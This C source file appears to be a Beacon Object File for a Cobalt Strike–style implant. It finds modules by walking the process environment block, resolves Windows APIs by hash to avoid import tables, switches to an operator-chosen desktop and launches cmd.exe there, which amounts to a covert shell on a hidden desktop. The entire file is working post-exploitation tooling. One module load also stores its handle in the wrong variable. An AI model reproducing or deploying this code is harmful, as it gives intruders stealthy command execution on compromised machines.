#include "common.h"
#include <shlobj.h>
#include <stdio.h>

typedef struct
{
    D_API( LdrLoadDll );
    D_API( RtlInitUnicodeString );
    D_API( CreateProcessA );
    D_API( GetThreadDesktop );
    D_API( SetThreadDesktop );
    D_API( OpenDesktopA );
    D_API( GetCurrentThreadId );
    D_API( CloseDesktop );
    D_API( SHGetFolderPathA );

} API, *PAPI;

VOID WINAPI BofMain( PBAPI_TABLE BeaconApi, PVOID Argv, INT Argc ) 
{
    API                 Api;
    UNICODE_STRING      Uni;
    DATAP               Parser;

    HANDLE              hMsvcrt = NULL;
    HANDLE              hNtdll = NULL;
    HANDLE              hKernel32 = NULL;
    HANDLE              hShell32 = NULL;
    HANDLE              hUser32 = NULL;

    PCHAR               DesktopName = NULL;
    HDESK               hDesk = NULL;
    HDESK               hOldDesk = NULL;

    BOOL                proc = FALSE;
    STARTUPINFOA        startupInfo = { 0 };
    PROCESS_INFORMATION processInfo = { 0 };


    RtlSecureZeroMemory( &Api, sizeof( Api ) );
    RtlSecureZeroMemory( &Uni, sizeof( UNICODE_STRING ) );
    RtlSecureZeroMemory( &Parser, sizeof( Parser ) );

    hNtdll = FindModule( H_LIB_NTDLL, NtCurrentTeb()->ProcessEnvironmentBlock );
    if( hNtdll == NULL )
    {
        BeaconApi->BeaconPrintf( CALLBACK_ERROR, "Failed to find ntdll.dll" );
        goto cleanup;
    };

    Api.LdrLoadDll = FindFunction( hNtdll, H_API_LDRLOADDLL );
    Api.RtlInitUnicodeString = FindFunction( hNtdll, H_API_RTLINITUNICODESTRING );

    if( !Api.LdrLoadDll ||
        !Api.RtlInitUnicodeString )
    {
        BeaconApi->BeaconPrintf( CALLBACK_ERROR, "Failed to find init functions" );
        goto cleanup;
    };

    hKernel32 = FindModule( H_LIB_KERNEL32, NtCurrentTeb()->ProcessEnvironmentBlock );
    if( hKernel32 == NULL )
    {
        BeaconApi->BeaconPrintf( CALLBACK_ERROR, "Failed to find kernel32.dll" );
        goto cleanup;
    };

    hMsvcrt = FindModule( H_LIB_MSVCRT, NtCurrentTeb()->ProcessEnvironmentBlock );
    if( hMsvcrt == NULL )
    {
        Api.RtlInitUnicodeString( &Uni, C_PTR( L"msvcrt.dll" ) );
        Api.LdrLoadDll( NULL, 0, &Uni, &hShell32 );
        RtlSecureZeroMemory( &Uni, sizeof( UNICODE_STRING ) );
    };

    hShell32 = FindModule( H_LIB_SHELL32, NtCurrentTeb()->ProcessEnvironmentBlock );
    if( hShell32 == NULL )
    {
        Api.RtlInitUnicodeString( &Uni, C_PTR( L"shell32.dll" ) );
        Api.LdrLoadDll( NULL, 0, &Uni, &hShell32 );
        RtlSecureZeroMemory( &Uni, sizeof( UNICODE_STRING ) );
    };

    hUser32 = FindModule( H_LIB_USER32, NtCurrentTeb()->ProcessEnvironmentBlock );
    if( hUser32 == NULL )
    {
        Api.RtlInitUnicodeString( &Uni, C_PTR( L"user32.dll" ) );
        Api.LdrLoadDll( NULL, 0, &Uni, &hUser32 );
        RtlSecureZeroMemory( &Uni, sizeof( UNICODE_STRING ) );
    };

    if( !hMsvcrt ||
        !hShell32 ||
        !hUser32 )
    {
        BeaconApi->BeaconPrintf( CALLBACK_ERROR, "Failed to find required modules" );
        goto cleanup;
    };

    Api.CreateProcessA = FindFunction( hKernel32, H_API_CREATEPROCESSA );
    Api.GetCurrentThreadId = FindFunction( hKernel32, H_API_GETCURRENTTHREADID );
    Api.SHGetFolderPathA = FindFunction( hShell32, H_API_SHGETFOLDERPATHA );
    Api.GetThreadDesktop = FindFunction( hUser32, H_API_GETTHREADDESKTOP );
    Api.SetThreadDesktop = FindFunction( hUser32, H_API_SETTHREADDESKTOP );
    Api.OpenDesktopA = FindFunction( hUser32, H_API_OPENDESKTOPA );
    Api.CloseDesktop = FindFunction( hUser32, H_API_CLOSEDESKTOP );

    if( !Api.CreateProcessA ||
        !Api.GetCurrentThreadId ||
        !Api.SHGetFolderPathA ||
        !Api.GetThreadDesktop ||
        !Api.SetThreadDesktop ||
        !Api.OpenDesktopA ||
        !Api.CloseDesktop )
    {
        BeaconApi->BeaconPrintf( CALLBACK_ERROR, "Failed to find required functions" );
        goto cleanup;
    };

    BeaconApi->BeaconDataParse( &Parser, Argv, Argc );

    DesktopName = BeaconApi->BeaconDataExtract( &Parser, NULL );
    if( DesktopName == NULL )
    {
        BeaconApi->BeaconPrintf( CALLBACK_ERROR, "Failed to get desktop name" );
        goto cleanup;
    };

    hOldDesk = Api.GetThreadDesktop( Api.GetCurrentThreadId() );
    if( hOldDesk == NULL )
    {
        BeaconApi->BeaconPrintf( CALLBACK_ERROR, "Failed to get original desktop" );
        goto cleanup;
    };

    hDesk = Api.OpenDesktopA( DesktopName, 0, TRUE, GENERIC_ALL );
    if( hDesk == NULL )
    {
        BeaconApi->BeaconPrintf( CALLBACK_ERROR, "Failed to open desktop" );
        goto cleanup;
    };

    if( !Api.SetThreadDesktop( hDesk ) )
    {
        BeaconApi->BeaconPrintf( CALLBACK_ERROR, "Failed to set desktop" );
        goto cleanup;
    };

    CHAR cmdPath[MAX_PATH] = { 0 };

    Api.SHGetFolderPathA( NULL, CSIDL_SYSTEM, NULL, 0, cmdPath );
    strcatA( cmdPath, "\\cmd.exe" );

    startupInfo.cb = sizeof( startupInfo );
    startupInfo.lpDesktop = DesktopName;
    proc = Api.CreateProcessA( NULL, cmdPath, NULL, NULL, FALSE, 0, NULL, NULL, &startupInfo, &processInfo );
    if( proc == FALSE )
    {
        BeaconApi->BeaconPrintf( CALLBACK_ERROR, "Failed to create process" );
        goto cleanup;
    };

cleanup:
    if( hOldDesk )
    {
        if( !Api.SetThreadDesktop( hOldDesk ) )
        {
            BeaconApi->BeaconPrintf( CALLBACK_ERROR, "Failed to restore desktop" );
        };

        Api.CloseDesktop( hOldDesk );
    };

    if( hDesk )
    {
        Api.CloseDesktop( hDesk );
    };

    RtlSecureZeroMemory( &Api, sizeof( Api ) );
    RtlSecureZeroMemory( &Uni, sizeof( UNICODE_STRING ) );
    RtlSecureZeroMemory( &Parser, sizeof( Parser ) );

    return;
};

VOID go( PVOID Argv, INT Argc )
{
    BAPI_TABLE Api;

    RtlSecureZeroMemory( &Api, sizeof( Api ) );
    Api.BeaconInjectProcess = C_PTR( BeaconInjectProcess );
    Api.BeaconDataExtract   = C_PTR( BeaconDataExtract );
    Api.BeaconDataParse     = C_PTR( BeaconDataParse );
    Api.BeaconDataShort     = C_PTR( BeaconDataShort );
    Api.BeaconIsAdmin       = C_PTR( BeaconIsAdmin );
    Api.BeaconPrintf        = C_PTR( BeaconPrintf );

    BofMain( &Api, Argv, Argc );
};
